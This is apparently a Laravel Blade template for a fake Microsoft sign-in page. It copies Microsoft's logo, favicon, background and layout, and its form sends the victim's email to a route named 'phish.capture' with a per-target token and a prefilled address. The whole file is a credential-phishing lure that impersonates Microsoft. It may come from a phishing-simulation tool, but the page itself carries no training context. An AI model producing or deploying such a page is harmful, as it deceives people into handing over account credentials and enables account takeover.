<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign in</title>
    <link rel="icon" href="https://logincdn.msauth.net/shared/1.0/image/favicon/microsoft.ico">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif;background:#f2f2f2;min-height:100vh;overflow:hidden}
        .outer{background-image:url('https://logincdn.msauth.net/shared/5/js/../images/fluent_web_light_2_145a07dcb971527a82b8.svg');background-size:cover;background-position:center;min-height:100vh;display:flex;align-items:center;justify-content:center;position:relative}
        .middle{width:100%;max-width:440px;position:relative}
        .inner{position:relative}
        .close-btn{position:absolute;top:-36px;right:-8px;width:36px;height:36px;background:none;border:none;border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;z-index:10}
        .close-btn:hover{background:rgba(0,0,0,.08)}
        .close-btn svg{fill:#616161;width:20px;height:20px}
        .logo-bar{text-align:center;margin-bottom:16px}
        .logo-bar svg{width:114px;height:24px}
        .card{background:#fff;border-radius:12px;padding:40px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
        h1{font-size:24px;font-weight:600;color:#242424;text-align:center;margin-bottom:12px}
        .subtitle{font-size:14px;color:#616161;text-align:center;margin-bottom:32px}
        .input-group{margin-bottom:16px}
        .input-group label{display:block;font-size:14px;color:#424242;margin-bottom:6px;font-weight:400}
        .input-group input{width:100%;height:40px;padding:8px 12px;font-size:16px;font-family:'Segoe UI',sans-serif;color:#242424;background:#fff;border:1px solid #616161;border-radius:8px;outline:none;transition:border-color .1s}
        .input-group input:focus{border-color:#0f6cbd;border-bottom:2px solid #0f6cbd}
        .forgot-link{margin-top:8px}
        .forgot-link button{background:none;border:none;color:#0f6cbd;font-size:14px;font-family:'Segoe UI',sans-serif;cursor:pointer;padding:0}
        .forgot-link button:hover{text-decoration:underline}
        .btn-next{width:100%;height:40px;background:#0f6cbd;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;font-family:'Segoe UI',sans-serif;cursor:pointer;margin-top:24px;transition:background .1s}
        .btn-next:hover{background:#115ea3}
        .create-acct{text-align:center;margin-top:20px;font-size:14px;color:#424242}
        .create-acct a{color:#0f6cbd;text-decoration:none;font-weight:600}
        .create-acct a:hover{text-decoration:underline}
        .footer{position:fixed;bottom:0;left:0;right:0;text-align:center;padding:16px;font-size:12px;color:#616161}
        .footer a{color:#616161;text-decoration:none;margin:0 8px}
        .footer a:hover{text-decoration:underline;color:#424242}
        .private-browse{font-size:12px;color:#616161;text-align:center;margin-top:24px;line-height:1.5}
        .private-browse a{color:#0f6cbd;text-decoration:none}
        .private-browse a:hover{text-decoration:underline}
    </style>
</head>
<body>
    <div class="outer">
        <div class="middle">
            <div class="inner">
                <div class="close-btn" title="Close">
                    <svg viewBox="0 0 24 24"><path d="m4.21 4.39.08-.1a1 1 0 0 1 1.32-.08l.1.08L12 10.6l6.3-6.3a1 1 0 1 1 1.4 1.42L13.42 12l6.3 6.3a1 1 0 0 1 .08 1.31l-.08.1a1 1 0 0 1-1.32.08l-.1-.08L12 13.4l-6.3 6.3a1 1 0 0 1-1.4-1.42L10.58 12l-6.3-6.3a1 1 0 0 1-.08-1.31l.08-.1-.08.1Z"/></svg>
                </div>

                <div class="logo-bar">
                    <svg aria-label="Microsoft" role="img" width="114" height="24" viewBox="0 0 114 24" fill="none">
                        <path d="M47.3 5.3v14.4h-2.5V8.4h-.03L40.3 19.7h-1.67L34.07 8.4H34v11.3h-2.3V5.3h3.6l4.13 10.67h.07l4.37-10.67h3.4z" fill="#737373"/>
                        <path d="M49.37 6.4c0-.4.13-.73.43-1 .3-.27.63-.4 1.03-.4.43 0 .8.13 1.07.43.27.27.4.6.4.83 0 .4-.13.73-.43 1-.3.27-.63.4-1.03.4-.43 0-.8-.13-1.07-.43-.27-.33-.4-.7-.4-1.1zM52.07 9.37V19.7h-2.43V9.37h2.43zM59.43 17.93c.37 0 .77-.1 1.2-.27.43-.17.83-.4 1.2-.67v2.27c-.4.23-.87.4-1.33.5-.5.1-1.03.17-1.63.17-1.53 0-2.77-.47-3.7-1.43-1-1-1.47-2.23-1.47-3.7 0-1.67.5-3.03 1.5-4.1 1-1.07 2.33-1.57 4.17-1.57.47 0 .9.07 1.4.17.47.13.83.27 1.1.4v2.33c-.27-.27-.67-.5-1.07-.63-.4-.17-.8-.27-1.2-.27-.97 0-1.73.3-2.33.93-.6.63-.9 1.47-.9 2.53 0 1.03.27 1.87.83 2.43.63.57 1.37.83 2.33.83zM68.73 9.2c.2 0 .37 0 .53.03.17.03.3.07.4.1v2.47c-.13-.1-.3-.17-.57-.27-.27-.1-.57-.17-.93-.17-.6 0-1.1.27-1.5.8V19.7h-2.43V9.37h2.43v1.63h.03c.23-.57.57-1 1-1.33.47-.3 1-.47 1.57-.47zM69.8 14.7c0-1.7.47-3.07 1.43-4.07.97-1 2.3-1.5 4.03-1.5 1.6 0 2.87.47 3.8 1.43.9.97 1.37 2.27 1.37 3.9 0 1.67-.47 3-1.43 4-1 1-2.3 1.5-4 1.5-1.6 0-2.87-.47-3.8-1.43-.97-1-1.4-2.3-1.4-3.83zM72.33 14.6c0 1.07.23 1.9.73 2.47.5.57 1.2.83 2.1.83s1.6-.27 2.1-.83c.47-.57.73-1.4.73-2.47 0-1.1-.27-1.93-.73-2.5-.5-.57-1.2-.87-2.1-.87s-1.6.3-2.1.9c-.53.57-.73 1.4-.73 2.5zM84 12.1c0 .33.1.63.33.83.23.2.7.43 1.47.73.97.4 1.67.83 2.03 1.3.4.5.6 1.07.6 1.77 0 1-.37 1.77-1.13 2.33-.73.6-1.77.9-3.03.9-.43 0-.9-.07-1.43-.17-.53-.1-.93-.23-1.3-.4v2.4c.43.3.97.53 1.43.7.53.17 1 .23 1.43.23 1.17 0 2.1-.27 2.8-.8.73-.53 1.1-1.27 1.1-2.23 0-.67-.17-1.23-.53-1.67-.33-.43-.87-.77-1.57-1.07-.97-.4-1.6-.73-1.9-1.03-.3-.3-.47-.67-.47-1.1 0-.93.37-1.7 1.1-2.3.73-.6 1.7-.9 2.87-.9.37 0 .77.03 1.2.1.43.07.83.17 1.2.3v2.17c-.33-.2-.73-.37-1.2-.47-.47-.1-.93-.17-1.37-.17-.47 0-.83.1-1.07.27-.23.23-.37.5-.37.83zM89.47 14.7c0-1.7.47-3.07 1.43-4.07.97-1 2.3-1.5 4.03-1.5 1.6 0 2.87.47 3.8 1.43.9.97 1.37 2.27 1.37 3.9 0 1.67-.47 3-1.43 4-1 1-2.3 1.5-4 1.5-1.6 0-2.87-.47-3.8-1.43-.97-1-1.4-2.3-1.4-3.83zM92 14.6c0 1.07.23 1.9.73 2.47.5.57 1.2.83 2.1.83s1.6-.27 2.1-.83c.47-.57.73-1.4.73-2.47 0-1.1-.27-1.93-.73-2.5-.5-.57-1.2-.87-2.1-.87s-1.6.3-2.1.9c-.53.57-.73 1.4-.73 2.5zM108.13 11.37h-3.64v8.33h-2.47v-8.33h-1.73V9.37h1.73V7.93c0-1.1.37-1.97 1.07-2.67.7-.7 1.6-1.03 2.7-1.03.3 0 .57 0 .8.03.23.03.43.07.6.1v2.1c-.07-.03-.23-.1-.43-.17-.2-.07-.43-.1-.67-.1-.5 0-.9.17-1.17.47-.27.33-.4.8-.4 1.4v1.23h3.64v-2.33l2.43-.73v3.07h2.47v2h-2.47v4.83c0 .63.1 1.1.33 1.33.23.27.6.4 1.1.4.13 0 .3-.03.5-.07.2-.07.37-.13.53-.23v2c-.17.1-.4.17-.67.23-.37.07-.67.1-1.03.1-1.03 0-1.8-.27-2.3-.83-.5-.47-.73-1.3-.73-2.4v-4.83z" fill="#737373"/>
                        <path d="M13.24 13.24H24.5V24.5H13.24V13.24Z" fill="#FFB900"/>
                        <path d="M.5 13.24H11.76V24.5H.5V13.24Z" fill="#00A4EF"/>
                        <path d="M13.24.5H24.5V11.76H13.24V.5Z" fill="#7FBA00"/>
                        <path d="M.5.5H11.76V11.76H.5V.5Z" fill="#F25022"/>
                    </svg>
                </div>

                <div class="card">
                    <h1>Sign in</h1>
                    <p class="subtitle">Use your Microsoft account.</p>

                    <form action="{{ route('phish.capture', ['provider' => 'microsoft', 'token' => $token]) }}" method="POST" autocomplete="off">
                        @csrf
                        <div class="input-group">
                            <label for="usernameEntry">Email or phone number</label>
                            <input type="email" id="usernameEntry" name="email" autocomplete="username webauthn" value="{{ $email }}">
                        </div>

                        <div class="forgot-link">
                            <button type="button">Forgot your username?</button>
                        </div>

                        <button type="submit" class="btn-next">Next</button>
                    </form>

                    <div class="create-acct">
                        New to Microsoft? <a href="#">Create an account</a>
                    </div>

                    <div class="private-browse">
                        Use private browsing if this is not your device. <a href="#">Learn more</a>
                    </div>
                </div>

                <div class="footer">
                    <a href="#">Help and feedback</a>
                    <a href="#">Terms of use</a>
                    <a href="#">Privacy and cookies</a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
